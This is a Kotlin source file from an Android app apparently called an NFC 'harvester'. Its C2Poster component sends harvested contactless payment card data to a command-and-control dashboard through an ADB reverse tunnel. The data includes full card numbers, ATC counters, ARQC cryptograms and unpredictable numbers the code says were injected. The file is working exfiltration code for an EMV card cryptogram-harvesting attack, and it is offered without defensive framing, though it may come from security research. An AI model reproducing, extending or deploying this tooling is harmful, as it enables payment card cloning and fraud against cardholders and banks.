package xyz.nfc.harvester

import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

/**
 * Posts a batch of harvested transactions to the C2 dashboard.
 *
 * Dashboard endpoint: POST http://127.0.0.1:4444/harvest
 * ADB reverse tunnel maps device 127.0.0.1:4444 → Mac port 4444.
 *
 * Expected body (matches dashboard.py db_store_harvest):
 * {
 *   "pan": "411111...",
 *   "aid": "A000000003101010",
 *   "network": "VISA",
 *   "harvested_txs": [
 *     { "atc": "0042", "arqc": "AABB..", "time_ms": 85.3, "params": "9F3704XXXXXXXX", "cve_id": 0 },
 *     ...
 *   ]
 * }
 *
 * "params" is minimal TLV containing just tag 9F37 (UN) so the dashboard's
 * decode_tlv() can extract and display the UN we injected.
 */
object C2Poster {
    private const val TAG      = "C2Poster"
    private const val BASE_URL = "http://127.0.0.1:4444"
    private const val TIMEOUT  = 8_000

    data class TxEntry(
        val atcHex:  String,
        val arqcHex: String,
        val unHex:   String,   // UN we injected (tag 9F37)
        val timingMs: Double
    )

    /** Returns true on HTTP 200, false on any error. Runs on calling thread — use IO dispatcher. */
    fun postBatch(pan: String, aid: String, txs: List<TxEntry>): Boolean {
        return try {
            val body = buildBody(pan, aid, txs)
            val conn = (URL("$BASE_URL/harvest").openConnection() as HttpURLConnection).apply {
                requestMethod     = "POST"
                connectTimeout    = TIMEOUT
                readTimeout       = TIMEOUT
                doOutput          = true
                setRequestProperty("Content-Type", "application/json")
                setRequestProperty("Accept",       "application/json")
            }
            conn.outputStream.bufferedWriter().use { it.write(body) }
            val code = conn.responseCode
            conn.disconnect()
            Log.i(TAG, "POST /harvest → HTTP $code  (${txs.size} txs, pan=****${pan.takeLast(4)})")
            code == 200
        } catch (e: Exception) {
            Log.e(TAG, "postBatch failed: ${e.message}")
            false
        }
    }

    private fun buildBody(pan: String, aid: String, txs: List<TxEntry>): String {
        val txArray = JSONArray()
        for (tx in txs) {
            // Encode UN as minimal BER-TLV: tag 9F37 (2 bytes) + len 04 + value (4 bytes)
            val paramsTlv = "9F3704${tx.unHex}"
            txArray.put(JSONObject().apply {
                put("atc",     tx.atcHex)
                put("arqc",    tx.arqcHex)
                put("time_ms", tx.timingMs)
                put("params",  paramsTlv)
                put("cve_id",  0)
            })
        }
        return JSONObject().apply {
            put("pan",            pan)
            put("aid",            aid)
            put("network",        if (aid.startsWith("A0000000031010")) "VISA" else "MC")
            put("harvested_txs",  txArray)
        }.toString()
    }
}
